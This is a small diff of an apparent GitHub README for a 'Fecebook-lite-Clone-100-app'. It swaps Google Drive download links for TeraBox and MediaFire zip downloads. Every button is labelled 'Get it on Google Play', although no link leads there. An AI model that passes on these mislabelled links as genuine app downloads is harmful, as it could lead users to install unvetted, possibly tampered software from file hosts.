@@ -48,16 +48,16 @@ href="https://drive.google.com/drive/folders/11nNLBe99I1qNGIf94B_3Sq3g6XTJYTHf">
      alt="Get it on Google Play"
      height="60"></a>
 <a
-href="https://drive.google.com/drive/folders/11nNLBe99I1qNGIf94B_3Sq3g6XTJYTHf"><img src="https://github.com/N47Noob/Fecebook-lite-Clone-100-app/blob/5645738fa9a733c2d5d5dddae4b352a80892d237/Images/button_server%20(1).png"
+href="#"><img src="https://github.com/N47Noob/Fecebook-lite-Clone-100-app/blob/5645738fa9a733c2d5d5dddae4b352a80892d237/Images/button_server%20(1).png"
      alt="Get it on Google Play"
      height="60"></a> 
 - Zip combine files on different servers:
 - <a
-href="https://drive.google.com/drive/folders/11nNLBe99I1qNGIf94B_3Sq3g6XTJYTHf"><img src="https://github.com/N47Noob/Fecebook-lite-Clone-100-app/blob/f430111c763b29684fd5591a97a7274d93015337/Images/button_server.png"
+href="https://teraboxapp.com/s/1TwCJ_dJSI_Vc8VpJEDgaug "><img src="https://github.com/N47Noob/Fecebook-lite-Clone-100-app/blob/f430111c763b29684fd5591a97a7274d93015337/Images/button_server.png"
      alt="Get it on Google Play"
      height="60"></a>
   <a
-href="https://drive.google.com/drive/folders/11nNLBe99I1qNGIf94B_3Sq3g6XTJYTHf"><img src="https://github.com/N47Noob/Fecebook-lite-Clone-100-app/blob/5645738fa9a733c2d5d5dddae4b352a80892d237/Images/button_server%20(1).png"
+href="https://www.mediafire.com/file/22al3ixbf115h58/Facebook+Lite+100.zip/file"><img src="https://github.com/N47Noob/Fecebook-lite-Clone-100-app/blob/5645738fa9a733c2d5d5dddae4b352a80892d237/Images/button_server%20(1).png"
      alt="Get it on Google Play"
      height="60"></a> 
 <!-- BEGIN LATEST DOWNLOAD BUTTON -->
